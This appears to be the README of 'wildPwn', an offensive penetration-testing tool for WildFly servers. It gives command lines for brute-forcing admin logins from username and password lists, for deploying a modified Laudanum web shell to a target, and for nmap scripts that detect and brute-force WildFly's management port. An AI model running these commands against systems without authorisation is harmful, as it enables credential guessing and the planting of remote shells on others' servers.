# wildPwn - WildFly Exploitation Tool
It is a tool for WildFly. Tool can be used to brute force or shell deploy. *wildPwn.war* contains modified Laudanum Shell. *userList.txt* contains common usernames and *passList.txt* contains common passwords.

# Usage
Bruteforce
```
python wildPwn.py -m brute --target <TARGET> -user <USERNAME LIST> -pass <PASSWORD LIST> 
```

Shell Deploy
```
python wildPwn.py -m deploy --target <TARGET> --port <PORT> -u <USERNAME> -p <PASSWORD>
```

# Details
https://artofpwn.com/wildfly-exploitation.html

# Video
[![PoC Video](https://i.ytimg.com/vi/kTsPwA7QhLU/maxresdefault.jpg)](https://www.youtube.com/watch?v=kTsPwA7QhLU)

# Nmap Scripts
Detection
```
nmap --script wildfly-detect <TARGET>
```

Brute Force
```
nmap -p 9990 --script wildfly-brute --script-args "userdb=usernameList.txt,passdb=passList.txt,hostname=domain.com" <TARGET>
```
